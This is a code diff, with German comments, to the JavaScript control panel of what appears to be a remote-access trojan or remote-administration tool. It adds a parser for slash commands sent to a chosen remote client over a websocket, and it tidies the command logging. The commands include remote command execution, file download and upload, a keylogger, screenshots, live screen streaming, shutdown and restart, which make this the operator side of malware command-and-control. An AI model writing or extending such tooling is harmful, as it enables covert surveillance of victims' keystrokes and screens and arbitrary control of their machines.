@@ -617,6 +617,40 @@
     }
 
     // --- BEFEHL SENDEN ---
+    // Hilfsfunktion: Slash-Befehl parsen
+    function parseSlashCommand(cmdText) {
+      if (!cmdText.startsWith("/")) return null;
+      const [slash, ...args] = cmdText.trim().split(" ");
+      const action = slash.replace("/", "");
+      const argument = args.join(" ");
+      switch (action) {
+        case "exec":
+          return { action, command: argument };
+        case "download":
+          return { action, path: argument };
+        case "upload":
+          // Upload handled separately
+          return { action };
+        case "history":
+          return { action, limit: parseInt(argument) || 20 };
+        case "keylogger":
+          return { action, count: parseInt(argument) || 50 };
+        case "ls":
+          return { action, path: argument || "." };
+        case "screenshot":
+        case "systeminfo":
+        case "shutdown":
+        case "restart":
+        case "screenstream_start":
+        case "screenstream_stop":
+          return { action };
+        case "help":
+          return { action };
+        default:
+          return { action };
+      }
+    }
+
     function sendCommand(customPayload = null) {
       if (!selectedClientId) {
         log("Fehler: Kein Client ausgewählt.", "error");
@@ -632,7 +666,7 @@
         if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
         if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
         let slashPayload = parseSlashCommand(commandText);
-        if (slashPayload) {
+        if (slashPayload && slashPayload.action) {
           payload = { target_id: selectedClientId, ...slashPayload };
         } else {
           const parts = commandText.split(" ");
@@ -676,8 +710,9 @@
         }
       }
       ws.send(JSON.stringify(payload));
+      // Logging: action immer anzeigen, Fallback auf "(unbekannt)"
       log(
-        `Befehl gesendet: ${payload.action}${
+        `Befehl gesendet: ${payload.action || "(unbekannt)"}${
           payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
         }`,
         "cmd"
